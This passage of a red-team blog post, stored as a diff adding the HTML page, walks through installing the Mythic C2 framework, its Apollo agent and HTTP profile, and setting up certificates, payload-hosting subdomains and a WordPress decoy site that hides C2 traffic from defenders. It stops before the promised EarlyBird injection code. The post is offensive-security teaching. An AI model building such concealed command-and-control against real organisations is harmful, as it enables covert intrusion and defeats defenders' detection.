@@ -1,0 +1,766 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->Mythic C2 with EarlyBird Injection and Defender Evasion</title><meta name="description" content="Let&#x27;s talk about building C2 infrastructure that actually works in the real world. Most red teamers think they can just spin up a Cobalt Strike server and ca..."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/mythic-c2-early-bird-defender-evasion"/><meta property="og:title" content="Mythic C2 with EarlyBird Injection and Defender Evasion"/><meta property="og:description" content="Let&#x27;s talk about building C2 infrastructure that actually works in the real world. Most red teamers think they can just spin up a Cobalt Strike server and ca..."/><meta property="og:image" content="https://xbz0n.sh/images/mythic-c2-infrastructure.jpeg"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="Mythic C2 with EarlyBird Injection and Defender Evasion"/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/mythic-c2-early-bird-defender-evasion"/><meta property="twitter:title" content="Mythic C2 with EarlyBird Injection and Defender Evasion"/><meta property="twitter:description" content="Let&#x27;s talk about building C2 infrastructure that actually works in the real world. Most red teamers think they can just spin up a Cobalt Strike server and ca..."/><meta property="twitter:image" content="https://xbz0n.sh/images/mythic-c2-infrastructure.jpeg"/><meta property="image" content="https://xbz0n.sh/images/mythic-c2-infrastructure.jpeg"/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/mythic-c2-early-bird-defender-evasion"/><meta name="next-head-count" content="24"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/be284b2f70ed0068.css" as="style"/><link rel="stylesheet" href="/_next/static/css/be284b2f70ed0068.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-ee7e63bc15b31913.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-0a3c670da7f1f1eb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6f140346224d0b31.js" defer=""></script><script src="/_next/static/chunks/676-8a913a0c6948fe82.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-80e53230ab478c73.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_buildManifest.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a><a href="https://app.hackthebox.com/public/users/8208" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="HackTheBox"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">← Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">Mythic C2 with EarlyBird Injection and Defender Evasion</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2025-06-23">June 23, 2025</time></div></div><div class="blog-content">
+<p><img src="/images/mythic-c2-infrastructure.jpeg" alt="Mythic C2 infrastructure with redirectors"></p>
+<h2>Introduction</h2>
+<p>Let's talk about building C2 infrastructure that actually works in the real world. Most red teamers think they can just spin up a Cobalt Strike server and call it a day, but that's how you get burned within hours. Modern blue teams know what to look for, and if your infrastructure screams "malicious C2 server," you're done before you even start. This article dives deep into building C2 infrastructure with a focus on foundational stealth and resilience, pushing past the basic setups that often get torched by modern blue teams. While initial deployments can be quickly spotted, the techniques we're covering here are a significant leap toward more robust operations.</p>
+<p>I've been running red team operations for years, and what I've learned is that your infrastructure makes or breaks your entire engagement. You can have the best exploits in the world, but if your command and control gets detected and blocked, you're toast. That's why I always invest serious time in building infrastructure that can survive detection.</p>
+<p>In this article, I'll walk you through setting up a complete Mythic C2 framework with robust HTTP/HTTPS redirectors, designed to obscure your true C2 infrastructure from direct internet exposure. While this setup employs principles similar to domain fronting by routing traffic through an intermediary, it focuses on a direct Nginx proxy configuration rather than leveraging a large CDN's infrastructure. Next up, we'll get into EarlyBird injection – a clever technique that's pretty effective for getting your payloads up and running by playing off how Windows creates processes, which can slip past certain modern EDR detections that are looking for more traditional injection methods.</p>
+<h2>Important Disclaimer: Foundational Principles</h2>
+<p>It's crucial to understand that this article provides a <strong>foundational overview</strong> of building C2 infrastructure and implementing EarlyBird injection. While these techniques are effective for demonstrating core principles of red team operations and evasion, real-world advanced persistent threats (APTs) and sophisticated red team engagements often employ significantly more advanced, layered, and ephemeral tradecraft to maintain stealth against modern defensive solutions.</p>
+<p>Consider the setup described here as a strong starting point for understanding the concepts. True operational security (OPSEC) in highly contested environments requires continuous research, adaptation, and integration of cutting-edge techniques that go beyond these fundamentals.</p>
+<p>The redirector configuration shown in this article is intentionally simple and tailored for instructional purposes. If you're interested in building more resilient and stealthy redirector chains with advanced traffic shaping, TLS termination, or CDN integration, check out my dedicated write-up here: 11. <a href="https://xbz0n.sh/blog/c2-redirectors">C2 Redirectors: Advanced Infrastructure for Modern Red Team Operations</a></p>
+<h2>Why This Setup Works</h2>
+<p>Before we dig into the tech, let's lay out why this particular infrastructure design is such a solid launching pad for understanding C2 operational security. The big takeaway is that modern defense ain't just about catching malware anymore – it's about dissecting communication patterns, figuring out infrastructure relationships, and spotting weird behavior.</p>
+<p>Our redirector serves legitimate content while secretly forwarding C2 traffic to the backend server. Blue teams see normal WordPress traffic, not suspicious C2 communications. All traffic is encrypted with legitimate certificates, making it nearly impossible to inspect the actual payload traffic without breaking SSL.</p>
+<p>Instead of dropping files to disk, our loader injects directly into memory using the EarlyBird technique, bypassing most file-based detection. We use real domain names, real SSL certificates, and real web content. Everything looks completely normal from the outside.</p>
+<p>The beauty of this approach is that each component has plausible deniability. A business website? Completely normal. API endpoints for booking systems? Makes perfect sense. Font files being downloaded? Happens on every website. It's only when you put all the pieces together that you see the real purpose.</p>
+<h2>Part 1: Setting Up Mythic C2 Framework</h2>
+<p>Mythic is hands down one of the best C2 frameworks available today. It's actively maintained, has excellent OPSEC features, and supports multiple agents and protocols. What I love about Mythic is that it's built from the ground up with real operations in mind.</p>
+<p>Let's get it running on our backend server.</p>
+<h3>Initial Mythic Installation</h3>
+<p>I'm setting this up on an Ubuntu server with internal IP 10.0.0.2. This server will never be directly exposed to the internet - all traffic will come through our redirectors. That's a critical point for OPSEC - your actual C2 server should be completely hidden behind your redirector infrastructure.</p>
+<pre class="language-bash"><code class="language-bash">git clone https://github.com/its-a-feature/Mythic.git
+cd Mythic/
+sudo ./install_docker_ubuntu.sh
+# After reboot, ensure Docker is running and Mythic containers are built
+# If starting fresh after reboot, navigate back to Mythic directory
+# cd Mythic/
+# sudo ./install_docker_ubuntu.sh # Run again only if Docker services didn't start correctly
+# You might also need to run `sudo systemctl start docker` if it didn't start automatically.
+sudo apt-get install make
+make
+</code></pre>
+<p>The installation script handles all the Docker setup and dependencies. After the reboot, we run it again to make sure everything's properly configured. The <code>make</code> command builds all the containers and gets everything ready.</p>
+<h3>Installing Apollo Agent</h3>
+<p>Apollo is Mythic's premier Windows agent. It's written in C# and has excellent capabilities for process injection, credential harvesting, and lateral movement.</p>
+<pre class="language-bash"><code class="language-bash">./mythic-cli install github https://github.com/MythicAgents/apollo
+</code></pre>
+<p>Apollo gives us everything we need for Windows environments - it can inject into processes, execute .NET assemblies in memory, and has built-in OPSEC features like sleep obfuscation and jitter.</p>
+<h3>Installing HTTP C2 Profile</h3>
+<p>The HTTP profile handles our web-based C2 communications. It's perfect for our redirector setup because it generates normal-looking HTTP traffic.</p>
+<pre class="language-bash"><code class="language-bash">./mythic-cli install github https://github.com/MythicC2Profiles/http
+</code></pre>
+<p>This profile supports multiple communication methods, including GET and POST requests that blend in perfectly with normal web traffic.</p>
+<h3>Starting Mythic</h3>
+<pre class="language-bash"><code class="language-bash">sudo ./mythic-cli start
+</code></pre>
+<p>Once everything's running, we can get our admin credentials:</p>
+<pre class="language-bash"><code class="language-bash">cat .env
+</code></pre>
+<p>This shows us the randomly generated admin password for the Mythic web interface. The server will be accessible on the internal network at <code>https://10.0.0.2:7443</code>.</p>
+<h2>Part 2: Building the Redirector Infrastructure</h2>
+<p>Now comes the fun part - setting up our redirector infrastructure. This is where we create the illusion of legitimate web services while secretly tunneling C2 traffic to our Mythic server.</p>
+<h3>Domain and Certificate Setup</h3>
+<p>First, you need to register a legitimate-looking domain. The key is picking something that sounds real and matches your target environment. A business or technology site works well because it explains why people might be visiting the domain.</p>
+<p>We need SSL certificates for all our subdomains:</p>
+<pre class="language-bash"><code class="language-bash">sudo certbot --nginx -d www.example-business.com -d api.example-business.com -d dl.example-business.com
+</code></pre>
+<p>This gives us legitimate SSL certificates from Let's Encrypt for:</p>
+<ul>
+<li><code>www.example-business.com</code> - Our decoy WordPress site</li>
+<li><code>api.example-business.com</code> - C2 communications endpoint</li>
+<li><code>dl.example-business.com</code> - Payload hosting endpoint</li>
+</ul>
+<h3>Creating the WordPress Decoy</h3>
+<p>A convincing decoy site is crucial for OPSEC. If someone investigates our domain, they need to find something believable. In this example, we use WordPress purely for demonstration purposes because it’s widely deployed and provides dynamic, realistic-looking content out of the box. However, in real operations, WordPress should generally be avoided—its large attack surface and frequent vulnerabilities make it a liability. If the decoy site gets compromised, it could jeopardize your entire infrastructure. A better approach in production is to use a static site (e.g., generated with Hugo, Jekyll, or plain HTML), which has a minimal attack surface and is far easier to lock down.</p>
+<pre class="language-bash"><code class="language-bash">sudo apt update
+sudo apt install -y ca-certificates curl gnupg lsb-release ufw
+sudo install -m0755 -d /etc/apt/keyrings
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
+  | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+echo \
+  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
+  https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" \
+  | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+sudo apt update
+sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
+sudo systemctl enable --now docker
+sudo usermod -aG docker $USER
+</code></pre>
+<p>Setting up the WordPress container:</p>
+<pre class="language-bash"><code class="language-bash">PROJECT_DIR="/opt/business-decoy"
+DOMAIN="example-business.com"
+
+mkdir -p "$PROJECT_DIR"
+cat > "$PROJECT_DIR/docker-compose.yml" &#x3C;&#x3C;EOF
+services:
+  wordpress:
+    image: wordpress:latest
+    ports:
+      - "127.0.0.1:8000:80"
+    environment:
+      WORDPRESS_DB_HOST: db
+      WORDPRESS_DB_USER: wordpress
+      WORDPRESS_DB_PASSWORD: wordpress
+      WORDPRESS_DB_NAME: wordpress
+      WORDPRESS_CONFIG_EXTRA: |
+        define('WP_HOME', 'https://$DOMAIN');
